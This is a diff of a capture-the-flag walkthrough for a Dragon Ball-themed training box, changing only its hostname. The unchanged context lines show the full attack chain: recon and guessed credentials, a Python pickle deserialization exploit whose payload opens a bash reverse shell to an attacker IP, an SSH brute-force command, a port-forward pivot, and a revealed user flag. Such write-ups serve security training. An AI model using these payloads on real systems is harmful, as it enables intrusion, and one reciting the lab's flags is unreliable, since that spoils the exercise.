@@ -2,7 +2,7 @@
 
 | | |
 |---|---|
-| **Box** | Capsule Corp (`capsulecorp.htb`) |
+| **Box** | Capsule Corp (`capsulecorp.thm`) |
 | **Difficulty** | Medium |
 | **Theme** | Dragon Ball / Capsule Corp — "Reunir las 7 Esferas del Dragón" |
 | **Key vulns** | CVE-2024-42069 insecure deserialization (CWE-502) → `sudo` tar wildcard injection; side-challenges: free-decryptor recovery, SSH local port-forward pivot, and request-tampering (Burp Repeater) |
@@ -36,7 +36,7 @@
 ## 1. Recon
 
 ```bash
-nmap -sC -sV -p- --min-rate 2000 capsulecorp.htb
+nmap -sC -sV -p- --min-rate 2000 capsulecorp.thm
 ```
 
 ```
@@ -54,7 +54,7 @@ are the first hints that this is an older, mail-driven environment.
 ## 2. FTP — anonymous (ball #1)
 
 ```bash
-ftp capsulecorp.htb        # user: anonymous, blank password
+ftp capsulecorp.thm        # user: anonymous, blank password
 ftp> ls
 ftp> get employee_roster.txt
 ftp> get network_diagram.png
@@ -88,7 +88,7 @@ The roster hints bulma reuses a weak password. The obvious Dragon Ball guess
 works: **`bulma:dragon`**.
 
 ```bash
-nc capsulecorp.htb 110
+nc capsulecorp.thm 110
 USER bulma
 PASS dragon
 LIST          # exactly 3 messages
@@ -120,7 +120,7 @@ We now have: web creds `goku:9000`, and the exact vulnerable version (2.4.1).
 
 ## 4. Web — Dragon Radar Dashboard
 
-Browse to `http://capsulecorp.htb/` and log in with **`goku:9000`**.
+Browse to `http://capsulecorp.thm/` and log in with **`goku:9000`**.
 
 The dashboard footer reveals the version and a second easter egg:
 
@@ -143,7 +143,7 @@ echo '<radar_session value>' | base64 -d | xxd | head
 
 The bytes are a **Python pickle** (dict with ASCII keys like `user`,
 `authenticated`). No HMAC suffix, no signature — it is raw, unsigned pickle. The
-full advisory is even served at `http://capsulecorp.htb/security/CVE-2024-42069`.
+full advisory is even served at `http://capsulecorp.thm/security/CVE-2024-42069`.
 
 ---
 
@@ -158,7 +158,7 @@ command on deserialization.
 nc -lvnp 4444
 
 # terminal 2: fire the PoC (ships with the box)
-python3 poc.py -t http://capsulecorp.htb -u goku -p 9000 --lhost 10.10.14.5 --lport 4444
+python3 poc.py -t http://capsulecorp.thm -u goku -p 9000 --lhost 10.10.14.5 --lport 4444
 ```
 
 Minimal manual version:
@@ -169,7 +169,7 @@ class RCE:
     def __reduce__(self):
         return (os.system, ("setsid bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' &",))
 cookie = base64.b64encode(pickle.dumps(RCE())).decode()
-requests.get("http://capsulecorp.htb/dashboard", cookies={"radar_session": cookie})
+requests.get("http://capsulecorp.thm/dashboard", cookies={"radar_session": cookie})
 ```
 
 The listener catches a shell as **www-data**.
@@ -211,7 +211,7 @@ The note sneers that a free Capsule recovery portal exists but refuses to name
 it — so fuzz the web root to find it:
 
 ```bash
-gobuster dir -u http://capsulecorp.htb \
+gobuster dir -u http://capsulecorp.thm \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 # /recovery  (Status: 200)   ("recovery" is in medium/raft lists)
 ```
@@ -234,13 +234,13 @@ cat dragon_ball_4.txt
 ## 7. Lateral movement -> goku (user.txt) + Gravity Chamber (ball #5)
 
 ```bash
-ssh goku@capsulecorp.htb        # password: chichi  (looted from config.py)
+ssh goku@capsulecorp.thm        # password: chichi  (looted from config.py)
 goku@capsulecorp:~$ cat user.txt
 ```
 
 > **Alternate (intended "brute" path):** goku reused a dumb dictionary password,
 > so you can also just brute-force SSH — it's in `rockyou.txt`:
-> `hydra -l goku -P /usr/share/wordlists/rockyou.txt ssh://capsulecorp.htb`
+> `hydra -l goku -P /usr/share/wordlists/rockyou.txt ssh://capsulecorp.thm`
 
 -> **user flag: `THM{us3r_g0ku_p0w3r_l3v3l_9000}`**
 
@@ -258,7 +258,7 @@ It is bound to `127.0.0.1` only, so forward it over SSH and open it in a browser
 
 ```bash
 # from the attacker box
-ssh -L 8081:127.0.0.1:8081 goku@capsulecorp.htb
+ssh -L 8081:127.0.0.1:8081 goku@capsulecorp.thm
 # then browse to http://localhost:8081/   (the Gravity Chamber console)
 ```
 
@@ -327,7 +327,7 @@ rootbash-5.x# cat /opt/shenlong/altar/RITUAL.txt   # names the 3 ritual conditio
 ```
 
 Kami-sama is dead, so Dende guards the 7th ball at the altar. Browse to
-`http://capsulecorp.htb/altar` **through Burp** and, under **Mission 1**, press
+`http://capsulecorp.thm/altar` **through Burp** and, under **Mission 1**, press
 *"Reclamar la Esfera de 7 Estrellas"*. The page sends a summon the server rejects
 (wrong on every field):
 
